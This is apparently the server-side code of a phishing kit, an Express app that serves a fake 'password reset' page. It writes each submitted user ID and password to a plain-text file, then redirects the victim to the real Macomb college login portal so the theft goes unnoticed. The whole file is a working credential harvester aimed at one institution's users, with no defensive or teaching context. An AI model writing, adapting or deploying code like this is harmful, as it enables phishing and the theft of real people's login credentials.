const http = require("http");
const host = 'localhost';
const port = 8000;

//var alert = require('alert');
var fs = require("fs");
var express = require('express');
const { userInfo } = require("os");
 
app = express(); 
app.use(express.json());
app.use(express.urlencoded());
app.use( express.static(__dirname + '/public'));
app.set("view options", {layout: false});
app.get('/', function(req, res) {
    res.sendFile(__dirname + '/public/pwm-reset.html');
});

var filename = "./userdata.txt"
app.post('/post-test', (req, res) => {
    var data = req.body.user_id + " - " + req.body.password1
    fs.appendFile(filename, data+"\n", function (err) {
        if (err) throw err;
        
        console.log('It\'s saved!');
        //alert("Password Reset")
        res.redirect('https://my.macomb.edu/');
      });  
});
app.listen(8080);

